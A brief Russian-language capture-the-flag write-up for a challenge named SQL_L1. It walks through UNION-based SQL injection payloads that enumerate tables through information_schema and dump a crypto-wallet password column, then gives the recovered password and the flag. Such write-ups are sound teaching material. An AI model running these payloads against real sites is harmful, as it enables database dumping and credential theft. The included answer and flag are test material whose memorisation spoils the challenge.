# WriteUp: SQL_L1

Ниже — авторский ход решения (из исходных материалов).

```
Решение L1
Задание: Необходимо узнать пароль от криптокошелька пользователя данного сайта.
Нам известно только имя: Маврин Арстан
ID криптокошелька: 675432112456
К сожалению иной информации у нас нет

Ход решения:

' OR 1=1;#
' union select table_name from information_schema.tables;#
' union select column_name from information_schema.columns where table_name='customer_crypto_wallet_info';#

Либо:
' union select customerName from customer_crypto_wallet_info;# 
Считаем какой по счету Маврин (17) из всего списка пользователей

' union select CryptoWalletPassword from customer_crypto_wallet_info;# 
Отсчитываем 17 паролей и берем 17й

Либо:
' union select CryptoWalletPassword from customer_crypto_wallet_info where idOfCryptoWallet="675432112456";# 

Ответ: cC3yisJ~ (нужно взять из инструмента разработчика, так как сайт переводит все в UpperCase)
Флаг: CTFKHV{cC3yisJ~}
```
